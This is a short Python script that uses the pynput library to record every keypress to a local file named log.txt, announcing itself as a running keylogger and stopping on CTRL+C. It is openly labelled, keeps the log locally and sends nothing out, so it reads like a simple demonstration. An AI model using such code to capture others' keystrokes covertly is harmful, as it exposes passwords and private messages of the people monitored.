from pynput.keyboard import Listener

# log keystrokes
def log_keystroke(key):
    key = str(key).replace("'", "")
    with open("log.txt", "a") as log_file:
        log_file.write(key + "\n")

# listening for keystrokes
def start_logging():
    try:
        with Listener(on_press=log_keystroke) as listener:
            listener.join()
    except KeyboardInterrupt:
        print("\n🛑 Program stopped by CTRL + C")

if __name__ == "__main__":
    print("Keylogger is running... (press CTRL + C to stop)")
    start_logging()